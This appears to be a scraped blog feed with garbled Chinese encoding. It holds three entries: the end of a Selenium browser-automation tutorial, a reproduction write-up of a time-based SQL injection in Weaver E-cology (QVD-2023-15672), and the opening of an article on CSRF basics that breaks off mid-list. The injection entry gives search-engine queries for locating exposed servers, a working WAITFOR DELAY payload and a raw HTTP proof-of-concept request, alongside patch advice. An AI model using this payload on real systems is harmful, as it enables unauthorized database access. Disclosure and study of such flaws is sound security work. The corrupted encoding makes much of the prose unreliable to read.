æ— ç•Œé¢è¿è¡Œï¼ˆæ— çª—å£ï¼‰</span></span><br><span class="line"><span class="comment">#--start-maximized æœ€å¤§åŒ–è¿è¡Œï¼ˆå…¨å±çª—å£ï¼‰</span></span><br><span class="line"><span class="comment">#--incognito éšèº«æ¨¡å¼ï¼ˆæ— ç—•æ¨¡å¼ï¼‰</span></span><br><span class="line"><span class="comment">#--disable-javascript ç¦ç”¨javascript</span></span><br><span class="line"><span class="comment">#--disable-infobars ç¦ç”¨æµè§ˆå™¨æ­£åœ¨è¢«è‡ªåŠ¨åŒ–ç¨‹åºæ§åˆ¶çš„æç¤º</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨æµè§ˆå™¨ï¼Œå¹¶å°†å¯åŠ¨å‚æ•°å¸¦å…¥åˆ°æµè§ˆå™¨ä¸­</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br></pre></td></tr></table></figure><p>4.è®¾ç½®å¯åŠ¨å‹å·</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è®¾ç½®æ‰‹æœºå‹å·1</span></span><br><span class="line">mobileEmulation = &#123;<span class="string">&#x27;deviceName&#x27;</span>: <span class="string">&#x27;iPhone 6/7/8&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#è®¾ç½®æ‰‹æœºå‹å·2</span></span><br><span class="line">mobileEmulation = &#123;</span><br><span class="line">    <span class="string">&quot;deviceMetrics&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;width&quot;</span>:<span class="number">350</span>,</span><br><span class="line">        <span class="string">&quot;height&quot;</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;pixelRatio&quot;</span>:<span class="number">3.0</span>,</span><br><span class="line">        <span class="string">&quot;touch&quot;</span>:<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰‹æœºæµè§ˆ</span></span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;mobileEmulation&#x27;</span>, mobileEmulation)</span><br></pre></td></tr></table></figure><p>5.æ¨¡æ‹Ÿç‚¹å‡»</p><p>æ‰‹æœºä¸‹æ“ä½œé¼ æ ‡!!æœ‰æ—¶å€™é¡µé¢å­˜åœ¨è¦†ç›–å±‚,éœ€è¦ç‚¹å‡»ä¸¤æ¬¡</p><p>è¿™é‡Œåƒç´ ç‚¹çš„è·å–æ¨èä½¿ç”¨googleæ’ä»¶Page Ruler Smart</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="comment">#ç‚¹å‡»70.120åƒç´ </span></span><br><span class="line">action = ActionChains(driver).move_by_offset(<span class="number">70</span>,<span class="number">120</span>).click()</span><br><span class="line"><span class="comment">#å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">action.perform()</span><br><span class="line"><span class="comment">#ç§»å›é¼ æ ‡</span></span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">70</span>,-<span class="number">120</span>).perform()</span><br></pre></td></tr></table></figure><p>6.æ¨¡æ‹Ÿæ‚¬åœ</p><p>è·å–ç™»å½•ä½ç½®ç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/&quot;</span>)</span><br><span class="line">denglu = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;header-login-entry&#x27;]&quot;</span>)</span><br><span class="line">ActionChains(driver).move_to_element(denglu).click().perform()</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»å¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šä¸ª</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/&quot;</span>)</span><br><span class="line"><span class="comment">#å®šä½åˆ°é¢‘é“</span></span><br><span class="line">pingdao = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;icon-bg icon-bg__channel&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment">#å®šä½åˆ°ç™»å½•</span></span><br><span class="line">denglu = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;header-login-entry&#x27;]&quot;</span>)</span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.click(pingdao)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">action.click(denglu)</span><br><span class="line">action.perform()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœ:å…ˆç‚¹å‡»é¢‘é“,åç‚¹å‡»ç™»å½•</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130003342.png"></p><h3 id="3-4æ¨¡æ‹Ÿäººç±»æ“ä½œ"><a href="#3-4æ¨¡æ‹Ÿäººç±»æ“ä½œ" class="headerlink" title="3.4æ¨¡æ‹Ÿäººç±»æ“ä½œ"></a>3.4æ¨¡æ‹Ÿäººç±»æ“ä½œ</h3><p>1.æ‰‹æœºå¤„ç†æ‹–æ‹½æ“ä½œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨æµè§ˆå™¨ï¼Œå¹¶å°†å¯åŠ¨å‚æ•°å¸¦å…¥åˆ°æµè§ˆå™¨ä¸­</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://xrect1fy.github.io/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‹–æ‹½æ“ä½œ</span></span><br><span class="line">first_tar = driver.find_element(By.XPATH,<span class="string">&quot;//a[@title=&#x27;PythonåŸºç¡€(æ›´æ–°ä¸­)&#x27;and@class=&#x27;article-title&#x27;]&quot;</span>)</span><br><span class="line">second_tar = driver.find_element(By.XPATH,<span class="string">&quot;//h1&quot;</span>)</span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.drag_and_drop(first_tar,second_tar).perform()</span><br></pre></td></tr></table></figure><p>æ‹–æ‹½æ“ä½œéœ€è¦ä½¿ç”¨xpathæˆ–è€…å…¶ä»–æ–¹æ³•æ‰¾åˆ°èµ·å§‹ä½ç½®å’Œç»ˆæœ«ä½ç½®</p><p>first_taræ˜¯åˆå§‹ä½ç½®,second_taræ˜¯ç»ˆæœ«ä½ç½®</p><p>åˆå§‹:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130017161.png"></p><p>ç»ˆæœ«:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130018316.png"></p><p>2.é¼ æ ‡ç‚¹å‡»åƒç´ çš„æ“ä½œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ActionChains(driver).move_by_offset(<span class="number">200</span>,<span class="number">300</span>).click().perform()</span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">200</span>,<span class="number">300</span>)</span><br></pre></td></tr></table></figure><p>3.ç‚¹å‡»å†™å…¥åªèƒ½ä¸€ä¸ªä¸€ä¸ªå­—æŒ‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ActionChains(driver).move_by_offset(<span class="number">500</span>,<span class="number">95</span>).click().key_down(<span class="string">&quot;a&quot;</span>).perform()</span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">500</span>,-<span class="number">95</span>).perform()</span><br></pre></td></tr></table></figure><p>é¼ æ ‡æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">click()ç‚¹å‡»é¼ æ ‡å·¦é”®</span><br><span class="line">click and hold() ç‚¹å‡»é¼ æ ‡å·¦é”®ä¸æ”¾</span><br><span class="line">context_click() ç‚¹å‡»é¼ æ ‡å³é”®ä¸æ”¾</span><br><span class="line">double_click() åŒå‡»é¼ æ ‡å·¦é”®</span><br><span class="line">drag_and_drop()é¼ æ ‡æ‹–æ‹½</span><br><span class="line">drag_and_drop_by_offset()é¼ æ ‡æ‹–æ‹½åˆ°å“ªä¸ªåæ ‡ç„¶åæ¾å¼€</span><br><span class="line">key_down(&quot;a&quot;)æŒ‰ä¸‹ä¸€ä¸ªé”®</span><br><span class="line">key_up(&quot;a&quot;)æŠ¬èµ·ä¸€ä¸ªé”®</span><br><span class="line">move_to_element(ele)ç§»åŠ¨é¼ æ ‡åˆ°æŸä¸ªå…ƒç´ çš„ä½ç½®</span><br><span class="line">move_to_element_with_offset(ele,100,0) ç§»åŠ¨åˆ°æŸä¸ªå…ƒç´ çš„ç›¸å¯¹å¤šå°‘è·ç¦»</span><br></pre></td></tr></table></figure><p>æ ¹æ®åƒç´ æ‹–æ‹½</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ‹–æ‹½æ“ä½œ</span></span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">first_tar = driver.find_element(By.XPATH,<span class="string">&quot;//a[@title=&#x27;XSSåŸºç¡€&#x27;and@class=&#x27;article-title&#x27;]&quot;</span>)</span><br><span class="line">ActionChains(driver).drag_and_drop_by_offset(first_tar,<span class="number">0</span>,<span class="number">10</span>).perform()</span><br></pre></td></tr></table></figure><p>4.å¤„ç†ä¸‹æ‹‰æ¡†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line">ele = driver.find_element(By.XPATH,<span class="string">&quot;//select[@class=&#x27;year&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment">#ä½¿ç”¨selectåŒ…è£¹èµ·æ¥xpathæŸ¥æ‰¾åˆ°çš„selectå…ƒç´ </span></span><br><span class="line">select1 = Select(ele)</span><br><span class="line"><span class="comment">#é€‰æ‹©å€¼æ˜¯åŠ¨æ¼«ä¸“åŒº</span></span><br><span class="line">result = select1.select_by_value(<span class="string">&quot;åŠ¨æ¼«ä¸“åŒº&quot;</span>)</span><br></pre></td></tr></table></figure><p>5.æ–°å»ºé€‰é¡¹å¡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ‰“å¼€æ–°æ ‡ç­¾é¡µ</span></span><br><span class="line">js = <span class="string">&#x27;window.open(&quot;http://www.baidu.com&quot;)&#x27;</span></span><br><span class="line">driver.execute_script(js)</span><br></pre></td></tr></table></figure><p>6.çª—å£åˆ‡æ¢</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(driver.current_url)</span><br><span class="line"><span class="comment">#åˆ‡æ¢çª—å£</span></span><br><span class="line">driver.switch_to.window(driver.window_handles[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#åˆ‡æ¢å›åˆå§‹çª—å£</span></span><br><span class="line">driver.switch_to.window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#window_handlesåˆ—è¡¨å…ˆåè®°å½•äº†æ‰“å¼€çª—å£çš„å¥æŸ„</span></span><br></pre></td></tr></table></figure><p>7.å…³äºiframeçš„å¤„ç†</p><p>è®ºå›</p><p>å¯»æ‰¾åˆ°iframeçš„ä½ç½®,èšç„¦è½¬æ¢åˆ°iframeä¸Š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">find_div = driver.find_element(å®šä½çš„å…ƒç´ )</span><br><span class="line">driver.switch_to.frame(find_div)</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾iframe,å›åˆ°ä¸»é¡µä¸Š!!</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#é‡Šæ”¾iframe,å›åˆ°ä¸»é¡µä¸Š</span></span><br><span class="line">driver.switch_to.default_content()</span><br></pre></td></tr></table></figure><p>8.å¤„ç†å¼¹çª—</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.switch_to.alert.accept()</span><br></pre></td></tr></table></figure><h2 id="4-å‚è€ƒæ–‡ç« "><a href="#4-å‚è€ƒæ–‡ç« " class="headerlink" title="4.å‚è€ƒæ–‡ç« "></a>4.å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/wangqiang_cyou/article/details/128900832">https://blog.csdn.net/wangqiang_cyou/article/details/128900832</a></p><p><a href="https://blog.csdn.net/u013454322/article/details/128399381">https://blog.csdn.net/u013454322/article/details/128399381</a></p><p><a href="https://blog.csdn.net/beichanbb/article/details/122240155?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168917719716800227438372%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168917719716800227438372&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122240155-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=selenium%20find_element&spm=1018.2226.3001.4187">seleniumä¸­çš„find_elementæ–¹æ³•</a></p>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ³›å¾®E-cology sqlå»¶æ—¶æ³¨å…¥æ¼æ´(QVD-2023-15672)å¤ç°</title>
      <link href="/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ³›å¾®E-cology-sqlå»¶æ—¶æ³¨å…¥æ¼æ´-QVD-2023-15672-å¤ç°"><a href="#æ³›å¾®E-cology-sqlå»¶æ—¶æ³¨å…¥æ¼æ´-QVD-2023-15672-å¤ç°" class="headerlink" title="æ³›å¾®E-cology sqlå»¶æ—¶æ³¨å…¥æ¼æ´(QVD-2023-15672)å¤ç°"></a>æ³›å¾®E-cology sqlå»¶æ—¶æ³¨å…¥æ¼æ´(QVD-2023-15672)å¤ç°</h1><p>å‚è€ƒæ–‡ç« :</p><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">æ³›å¾®E-Cology SQLæ³¨å…¥æ¼æ´å¤ç°ï¼ˆQVD-2023-15672ï¼‰</a></p><h2 id="1-äº§å“ç®€ä»‹"><a href="#1-äº§å“ç®€ä»‹" class="headerlink" title="1.äº§å“ç®€ä»‹"></a>1.äº§å“ç®€ä»‹</h2><p>æ³›å¾®E-cologyç³»ç»Ÿæ˜¯ä¸­å›½æ³›å¾®ç½‘ç»œç§‘æŠ€è‚¡ä»½æœ‰é™å…¬å¸ï¼ˆä»¥ä¸‹ç®€ç§°â€œæ³›å¾®ç§‘æŠ€â€ï¼‰å¼€å‘çš„ä¸€ç§ä¼ä¸šçº§ååŒåŠå…¬å¹³å°ã€‚è¯¥ç³»ç»Ÿä»¥åŠå…¬è‡ªåŠ¨åŒ–å’ŒååŒåŠå…¬ä¸ºæ ¸å¿ƒï¼Œæä¾›äº†ä¸€ç³»åˆ—åŠŸèƒ½å’Œå·¥å…·ï¼Œå¸®åŠ©ä¼ä¸šå®ç°ä¿¡æ¯ç®¡ç†ã€æµç¨‹ç®¡æ§ã€å›¢é˜Ÿåä½œå’Œä¸šåŠ¡åº”ç”¨ç­‰å¤šæ–¹é¢çš„éœ€æ±‚ã€‚</p><p>æ³›å¾®E-cologyç³»ç»Ÿå…·æœ‰ä»¥ä¸‹ä¸»è¦ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼š</p><ol><li>åŠå…¬è‡ªåŠ¨åŒ–ï¼šç³»ç»Ÿæ”¯æŒä¼ä¸šå†…éƒ¨çš„å„ç§åŠå…¬æµç¨‹è‡ªåŠ¨åŒ–ï¼ŒåŒ…æ‹¬å®¡æ‰¹æµç¨‹ã€è¯·å‡æµç¨‹ã€æŠ¥é”€æµç¨‹ç­‰ï¼Œæé«˜å·¥ä½œæ•ˆç‡å’Œå‡å°‘é‡å¤æ€§å·¥ä½œã€‚</li><li>ååŒåŠå…¬ï¼šç³»ç»Ÿæä¾›äº†å›¢é˜Ÿåä½œã€æ–‡æ¡£åˆ†äº«å’Œè®¨è®ºç­‰åŠŸèƒ½ï¼Œä¾¿äºå‘˜å·¥ä¹‹é—´çš„ä¿¡æ¯å…±äº«å’Œåè°ƒï¼Œå¢å¼ºå›¢é˜Ÿåˆä½œå’Œæ²Ÿé€šæ•ˆç‡ã€‚</li><li>ä¼ä¸šä¿¡æ¯ç®¡ç†ï¼šç³»ç»Ÿå¯ä»¥é›†ä¸­ç®¡ç†ä¼ä¸šçš„äººå‘˜ä¿¡æ¯ã€ç»„ç»‡æ¶æ„ã€é¡¹ç›®ä¿¡æ¯ç­‰é‡è¦æ•°æ®ï¼Œæ–¹ä¾¿ä¼ä¸šå¯¹ä¿¡æ¯è¿›è¡Œç»Ÿä¸€ç®¡ç†å’ŒæŸ¥è¯¢ã€‚</li><li>ä¸šåŠ¡åº”ç”¨æ‰©å±•ï¼šç³»ç»Ÿæ”¯æŒè‡ªå®šä¹‰ä¸šåŠ¡åº”ç”¨çš„å¼€å‘å’Œé›†æˆï¼Œå¯ä»¥æ ¹æ®ä¼ä¸šçš„å®é™…éœ€æ±‚å®šåˆ¶ç‰¹å®šçš„åº”ç”¨æ¨¡å—ï¼Œæ»¡è¶³ä¼ä¸šçš„ä¸ªæ€§åŒ–éœ€æ±‚ã€‚</li><li>å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶ï¼šç³»ç»Ÿå…·å¤‡ä¸¥æ ¼çš„æƒé™ç®¡ç†å’Œå®‰å…¨æœºåˆ¶ï¼Œç¡®ä¿ç”¨æˆ·æ•°æ®çš„å®‰å…¨æ€§å’Œè®¿é—®æ§åˆ¶ã€‚</li></ol><p>æ³›å¾®E-cologyç³»ç»Ÿé€‚ç”¨äºå„ç±»ä¼ä¸šå’Œç»„ç»‡ï¼Œå¯ä»¥å¸®åŠ©ä¼ä¸šä¼˜åŒ–æµç¨‹ã€æé«˜å·¥ä½œæ•ˆç‡ã€åŠ å¼ºå›¢é˜Ÿåä½œï¼Œæå‡æ•´ä½“ç®¡ç†æ°´å¹³ã€‚åŒæ—¶ï¼Œæ³›å¾®ç§‘æŠ€ä¹Ÿä¸æ–­è¿›è¡ŒæŠ€æœ¯åˆ›æ–°å’Œäº§å“ä¼˜åŒ–ï¼Œä»¥æ»¡è¶³ä¸åŒä¼ä¸šçš„ä¸ªæ€§åŒ–éœ€æ±‚ã€‚</p><h2 id="2-æ¼æ´æ¦‚è¿°"><a href="#2-æ¼æ´æ¦‚è¿°" class="headerlink" title="2.æ¼æ´æ¦‚è¿°"></a>2.æ¼æ´æ¦‚è¿°</h2><p>æ³›å¾®E-cologyçš„å»¶æ—¶SQLæ³¨å…¥æ¼æ´å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥è·å–æœªç»æˆæƒçš„æ•°æ®åº“è®¿é—®æƒé™ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€ä¿®æ”¹æ•°æ®æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„æ³¨å…¥å­—ç¬¦ä¸²ï¼Œæ“çºµåº”ç”¨ç¨‹åºçš„æ•°æ®åº“æŸ¥è¯¢ï¼Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚</p><p>å»¶æ—¶SQLæ³¨å…¥æ¼æ´çš„å±å®³åœ¨äºï¼Œå®ƒå¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²ã€ç³»ç»Ÿå´©æºƒã€ä¸šåŠ¡ä¸­æ–­ï¼Œç”šè‡³å¯èƒ½ä¸ºæ”»å‡»è€…æä¾›å…¨é¢çš„æ§åˆ¶æƒé™ï¼Œä»è€Œå±å®³ä¼ä¸šçš„ä¿¡æ¯å®‰å…¨å’Œä¸šåŠ¡è¿ä½œã€‚</p><h2 id="3-å½±å“èŒƒå›´"><a href="#3-å½±å“èŒƒå›´" class="headerlink" title="3.å½±å“èŒƒå›´"></a>3.å½±å“èŒƒå›´</h2><p>E-cology 9.x è¡¥ä¸ç‰ˆæœ¬ &lt; 10.58.0</p><p>E-cology 8.x è¡¥ä¸ç‰ˆæœ¬ &lt; 10.58.0</p><h2 id="4-å¤ç°è¿‡ç¨‹"><a href="#4-å¤ç°è¿‡ç¨‹" class="headerlink" title="4.å¤ç°è¿‡ç¨‹"></a>4.å¤ç°è¿‡ç¨‹</h2><p>1.èµ„äº§æ£€ç´¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¹°å›¾:web.icon=&quot;41eca7a9245394106a09b2534d8030df&quot;</span><br><span class="line">fofa:app=&quot;æ³›å¾®-ååŒå•†åŠ¡ç³»ç»Ÿ&quot;</span><br></pre></td></tr></table></figure><p>2.æ¼æ´å¤ç°</p><p>è®¿é—®æœç´¢åˆ°çš„èµ„äº§</p><p>å°è¯•è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ip]/weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A8%27&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure><p>å‘ç°sleep8ç§’ååŠ è½½å†…å®¹</p><p>åŠ è½½8ç§’åæˆåŠŸåŠ è½½:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121245154.png"></p><p>éªŒè¯æˆåŠŸã€‚</p><p>Poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A7%27&amp;isFromOutImg=1HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="5-ä¿®å¤æ–¹æ¡ˆ"><a href="#5-ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="5.ä¿®å¤æ–¹æ¡ˆ"></a>5.ä¿®å¤æ–¹æ¡ˆ</h2><p>ä¸´æ—¶è§£å†³æ–¹æ¡ˆ:</p><p>é™åˆ¶è®¿é—®æ¥æºåœ°å€ï¼Œå¦‚éå¿…è¦ï¼Œä¸è¦å°†ç³»ç»Ÿå¼€æ”¾åœ¨äº’è”ç½‘ä¸Šã€‚</p><p>å‡çº§ä¿®å¤æ–¹æ¡ˆ:</p><p>å®˜æ–¹å·²å‘å¸ƒå®‰å…¨è¡¥ä¸,å»ºè®®å—å½±å“ç”¨æˆ·å°½å¿«å‡çº§è‡³10.58åŠä»¥ä¸Šç‰ˆæœ¬</p><p><a href="https://www.weaver.com.cn/cs/securityDownload.asp#">https://www.weaver.com.cn/cs/securityDownload.asp#</a></p><h2 id="6-å‚è€ƒæ–‡ç« "><a href="#6-å‚è€ƒæ–‡ç« " class="headerlink" title="6.å‚è€ƒæ–‡ç« "></a>6.å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">æ³›å¾®E-Cology SQLæ³¨å…¥æ¼æ´å¤ç°ï¼ˆQVD-2023-15672ï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRFåŸºç¡€</title>
      <link href="/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="1-CSRFåŸºç¡€"><a href="#1-CSRFåŸºç¡€" class="headerlink" title="1.CSRFåŸºç¡€"></a>1.CSRFåŸºç¡€</h2><p>CSRFï¼ˆCross-Site Request Forgeryï¼‰ï¼Œä¹Ÿç§°ä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webåº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ã€‚å®ƒåˆ©ç”¨äº†Webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¯·æ±‚çš„ä¿¡ä»»ï¼Œæ”»å‡»è€…é€šè¿‡æ¬ºéª—ç”¨æˆ·åœ¨å—å®³è€…èº«ä»½ä¸‹æ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><p>CSRFæ”»å‡»çš„åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ç”¨æˆ·ç™»å½•ï¼šç”¨æˆ·åœ¨ä¸€ä¸ªç½‘ç«™Aä¸Šè¿›è¡Œç™»å½•ï¼Œç½‘ç«™Aä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªä¼šè¯ï¼ˆsessionï¼‰ã€‚</li><li>æ¶æ„ç½‘ç«™ï¼šç”¨æˆ·åç»­æµè§ˆå…¶ä»–ç½‘ç«™æ—¶ï¼Œè®¿é—®äº†ä¸€ä¸ªæ¶æ„ç½‘ç«™Bã€‚</li><li>ä¼ªé€ è¯·æ±‚ï¼šæ¶æ„ç½‘ç«™Bä¼šæ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¼šé’ˆå¯¹ç”¨æˆ·åœ¨ç½‘ç«™Aä¸Šçš„èº«ä»½è¿›è¡Œæ“ä½œï¼Œä¾‹å¦‚ä¿®æ”¹å¯†ç ã€è½¬è´¦ç­‰ã€‚</li><li>ä¼ªè£…è¯·æ±‚ï¼šæ¶æ„ç½‘ç«™Bä½¿ç”¨å„ç§æŠ€æœ¯æ‰‹æ®µï¼Œå¦‚éšè—è¡¨å•ã€å›¾ç‰‡æ ‡ç­¾æˆ–è€…é€šè¿‡Ajaxè¯·æ±‚ç­‰ï¼Œå°†è¿™ä¸ªä¼ªé€ çš„è¯·æ±‚å‘é€ç»™ç½‘ç«™Aã€‚</li><li>ç”¨æˆ·è¯¯æ“ä½œï¼šç”±äºç”¨æˆ·å·²ç»ç™»å½•äº†ç½‘ç«™Aå¹¶ä¿¡ä»»è¯¥ç½‘ç«™ï¼Œæµè§ˆå™¨ä¼šåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å‘é€ä¼ªé€ è¯·æ±‚ï¼Œå¹¶æ‰§è¡Œæ¶æ„æ“ä½œã€‚</li></ol><p>CSRFæ”»å‡»çš„å±å®³å–å†³äºå—åˆ°æ”»å‡»çš„ç½‘ç«™çš„ä¸šåŠ¡é€»è¾‘å’Œç”¨æˆ·æƒé™ã€‚è¯¥æ¼æ´å¯èƒ½å¯¼è‡´ç”¨æˆ·è´¦æˆ·è¢«ç›—ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€éæˆæƒæ“ä½œç­‰ã€‚ä¸ºäº†é˜²èŒƒCSRFæ”»å‡»ï¼Œå¼€å‘è€…å¯ä»¥é‡‡å–ä¸€äº›æªæ–½ï¼Œå¦‚ä½¿ç”¨CSRFä»¤ç‰Œã€éªŒè¯Refererå¤´ã€åŒé‡å› ç´ èº«ä»½éªŒè¯ç­‰ã€‚</p><p>æ¼æ´å±å®³</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…·ä½“åŠŸèƒ½å†³å®šå±å®³ç¨‹åº¦</span><br><span class="line">ä¿®æ”¹æ€§åˆ« / ä¸ªäººä¿¡æ¯ç­‰</span><br><span class="line">ä¿®æ”¹ç®¡ç†å‘˜å¯†ç </span><br><span class="line">æ·»åŠ ç®¡ç†å‘˜</span><br><span class="line">åå°getshell</span><br></pre></td></tr></table></figure><h2 id="2-CSRFé˜²å¾¡"><a href="#2-CSRFé˜²å¾¡" class="headerlink" title="2.CSRFé˜²å¾¡"></a>2.CSRFé˜²å¾¡</h2><p>1.éªŒè¯HTTP Refererå­—æ®µ<br>2.æ·»åŠ Tokenå­—æ®µå¹¶éªŒè¯<br>3.æ·»åŠ è‡ªå®šä¹‰å­—æ®µå¹¶éªŒè¯</p><h2 id="3-CSRFæ¼æ´æ£€æµ‹"><a href="#3-CSRFæ¼æ´æ£€æµ‹" class="headerlink" title="3.CSRFæ¼æ´æ£€æµ‹"></a>3.CSRFæ¼æ´æ£€æµ‹</h2><p>æ¼æ´æ£€æµ‹:<br>a.æ•æ„ŸåŠŸèƒ½ç¼ºä¹csrfé˜²æŠ¤æœºåˆ¶</p><ol><li>åœ¨burpsuiteä¸­è§‚å¯Ÿpostè¯·æ±‚æ˜¯å¦å¸¦æœ‰éšæœºToken å’Œ éªŒè¯ç </li><li>å†åˆ¤æ–­ å»æ‰&#x2F;ä¿®æ”¹ 